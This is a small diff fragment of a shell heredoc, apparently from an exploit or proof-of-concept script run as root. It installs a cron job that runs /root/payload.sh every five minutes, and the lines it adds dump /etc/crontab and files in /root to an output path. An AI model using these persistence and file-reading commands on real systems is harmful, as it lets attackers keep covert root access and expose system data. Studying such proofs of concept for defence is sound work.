@@ -26,6 +26,8 @@ echo */5 * * * * /root/payload.sh >> /root/mycron
 crontab /root/mycron 2> \${OUTPATH}
 ls /root >> \${OUTPATH}
 cat /etc/crontab >> \${OUTPATH} 1>&1
+cat /root/refresh_images.bash >> \${OUTPATH}
+cat /root/mycron >> \${OUTPATH}
 
 __EOF__
 
